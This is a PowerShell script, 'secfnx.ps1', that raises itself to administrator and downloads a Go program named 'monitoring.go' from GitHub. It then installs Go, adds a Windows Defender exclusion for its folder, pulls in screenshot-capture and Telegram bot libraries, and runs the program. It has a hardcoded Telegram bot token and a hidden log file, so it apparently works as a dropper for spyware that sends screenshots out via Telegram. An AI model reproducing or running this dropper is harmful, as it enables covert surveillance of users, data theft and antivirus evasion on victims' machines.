# secfnx.ps1
# Fully functional version
param(
    [string]$BotToken = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE",
    [switch]$Auto,
    [switch]$RunHidden,
    [switch]$Uninstall
)

# Config
$LogFile = Join-Path $env:TEMP "download_runner.log"
$MsiName = "go1.25.1.windows-386.msi"
$MsiUrl = "https://go.dev/dl/go1.25.1.windows-386.msi"
$GoInstallDir = "C:\Program Files\Go"
$GoBinPath = Join-Path $GoInstallDir "bin"
$GoFileName = "monitoring.go"
$DestFolder = Join-Path $env:USERPROFILE "Downloads\secfnx"
$GoFilePath = Join-Path $DestFolder $GoFileName
$ImageFolder = Join-Path $DestFolder "images"
$PathLog = Join-Path $DestFolder "path_sec.log"
$LogMaxSize = 10MB
$Url = "https://github.com/ArthOfficial/TEST/blob/main/monitoring.go"

# Helpers
function Status-Output { param([string]$Message,[bool]$Success) if($Success){Write-Host "[True] $Message"}else{Write-Host "[False] $Message"} }

function Log { param($Message) $Line="$(Get-Date -Format o) - $Message"; if(Test-Path $LogFile){ $LogSize=(Get-Item $LogFile).Length; if($LogSize -ge $LogMaxSize){Rename-Item $LogFile "$LogFile.$(Get-Date -Format 'yyyyMMddHHmmss').bak" -ErrorAction SilentlyContinue } } Add-Content $LogFile $Line -ErrorAction SilentlyContinue; Write-Output $Line }

function Log-Path { param($Path,$Type) Add-Content -Path $PathLog -Value "$(Get-Date -Format o) - ${Type}: $Path" -ErrorAction SilentlyContinue }

function Test-IsAdmin { try { ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch { $false } }

function Download-File($SourceUrl,$OutPath) {
    Log "Downloading $SourceUrl -> $OutPath"
    try {
        $ProgressPreference='Continue'
        Invoke-WebRequest -Uri $SourceUrl -OutFile $OutPath -ErrorAction Stop
        Log-Path $OutPath "File Downloaded"
        Status-Output "Download $OutPath" $true
        return $true
    } catch { Log "Download failed: $_"; Status-Output "Download $OutPath" $false; return $false } finally { $ProgressPreference='SilentlyContinue' }
}

function Add-ToSystemPath($Path) {
    if(-not(Test-IsAdmin)){Log "Cannot modify PATH: not admin"; Status-Output "Add to PATH $Path" $false; return $false }
    try {
        $CurrentPath=[Environment]::GetEnvironmentVariable("Path",[System.EnvironmentVariableTarget]::Machine)
        if($CurrentPath -notlike "*$Path*"){ [Environment]::SetEnvironmentVariable("Path","$CurrentPath;$Path",[System.EnvironmentVariableTarget]::Machine); Status-Output "Add to PATH $Path" $true } else { Status-Output "Add to PATH $Path (already exists)" $true }
    } catch { Log "Failed to update PATH: $_"; Status-Output "Add to PATH $Path" $false; return $false }
}

function Add-DefenderExclusion($Path) {
    if(-not(Test-IsAdmin)){Log "Cannot add Defender exclusion: not admin"; Status-Output "Defender Exclusion $Path" $false; return $false }
    try{Add-MpPreference -ExclusionPath $Path -ErrorAction Stop; Status-Output "Defender Exclusion $Path" $true} catch { Log "Defender exclusion failed: $_"; Status-Output "Defender Exclusion $Path" $false; return $false }
}

function Install-Go {
    $MsiPath=Join-Path $DestFolder $MsiName
    if(-not(Test-Path $MsiPath)){ if(-not(Download-File $MsiUrl $MsiPath)){ Status-Output "Install Go" $false; return $false } }
    if(Test-Path (Join-Path $GoInstallDir "bin\go.exe")) { Status-Output "Install Go" $true; return $true }
    try { Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$MsiPath`"" -Wait; Add-ToSystemPath $GoBinPath; [Environment]::SetEnvironmentVariable("GOROOT",$GoInstallDir,[System.EnvironmentVariableTarget]::Machine); Status-Output "Install Go" $true; return $true } catch { Log "Go install error: $_"; Status-Output "Install Go" $false; return $false }
}

function Install-GoDependencies($GoFile) {
    if(-not(Test-Path $GoFile)){ Status-Output "Install Dependencies" $false; return $false }
    try {
        $Env:PATH="$Env:PATH;$GoBinPath"
        if(Test-Path (Join-Path $DestFolder "go.mod")){Remove-Item (Join-Path $DestFolder "go.mod") -Force -ErrorAction SilentlyContinue; Log-Path (Join-Path $DestFolder "go.mod") "File Deleted" }
        if(Test-Path (Join-Path $DestFolder "go.sum")){Remove-Item (Join-Path $DestFolder "go.sum") -Force -ErrorAction SilentlyContinue; Log-Path (Join-Path $DestFolder "go.sum") "File Deleted" }
        Start-Process -FilePath "go" -ArgumentList "mod","init","monitoring" -WorkingDirectory $DestFolder -Wait -NoNewWindow
        Start-Process -FilePath "go" -ArgumentList "get","-v","github.com/kbinani/screenshot","github.com/go-telegram-bot-api/telegram-bot-api/v5" -WorkingDirectory $DestFolder -Wait -NoNewWindow
        Status-Output "Install Dependencies" $true
        return $true
    } catch { Log "Dependency install error: $_"; Status-Output "Install Dependencies" $false; return $false }
}

function Run-GoScript($GoFile) {
    if(-not(Test-Path $GoFile)){ Status-Output "Run Go Script" $false; return $false }
    try { 
        if(-not(Test-Path $ImageFolder)){ New-Item -Path $ImageFolder -ItemType Directory -Force | Out-Null; Status-Output "Create Image Folder" $true }
        $Env:PATH="$Env:PATH;$GoBinPath"
        Start-Process -FilePath "go" -ArgumentList "run",$GoFile -WorkingDirectory $DestFolder -Wait -NoNewWindow
        Status-Output "Run Go Script" $true
        return $true
    } catch { Log "Failed to run Go script: $_"; Status-Output "Run Go Script" $false; return $false }
}

function Uninstall-Secfnx {
    try {
        if(Test-Path $DestFolder){ Remove-Item $DestFolder -Recurse -Force; Status-Output "Remove secfnx folder" $true }
        if(Test-Path $PathLog){ Remove-Item $PathLog -Force; Status-Output "Remove path log" $true }
        $BatchFile=Join-Path $env:TEMP "secfnx_uninstall.bat"
        if(Test-Path $BatchFile){ Remove-Item $BatchFile -Force; Status-Output "Remove batch file" $true }
        Status-Output "Uninstall Completed" $true
    } catch { Log "Uninstall error: $_"; Status-Output "Uninstall Completed" $false }
}

# Main
if($Uninstall){ Uninstall-Secfnx; exit }
if(-not(Test-IsAdmin)){ Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$PSScriptRoot\$($MyInvocation.MyCommand.Name)`""; exit }

if(-not(Test-Path $DestFolder)){ New-Item -Path $DestFolder -ItemType Directory -Force | Out-Null; Status-Output "Create Folder" $true }
if(-not(Test-Path $PathLog)){ New-Item -Path $PathLog -ItemType File -Force | Out-Null; Set-ItemProperty -Path $PathLog -Name Attributes -Value "Hidden"; Status-Output "Create Path Log" $true }

if($Url -match "github.com/.+/blob/(.+)$"){ $Url=$Url -replace "https://github.com/","https://raw.githubusercontent.com/" -replace "/blob/","/" }

if(-not(Download-File $Url $GoFilePath)){ exit 1 }
if(-not(Install-Go)){ exit 1 }
Add-DefenderExclusion $DestFolder
if(-not(Install-GoDependencies $GoFilePath)){ exit 1 }
Run-GoScript $GoFilePath
Status-Output "Script Completed" $true
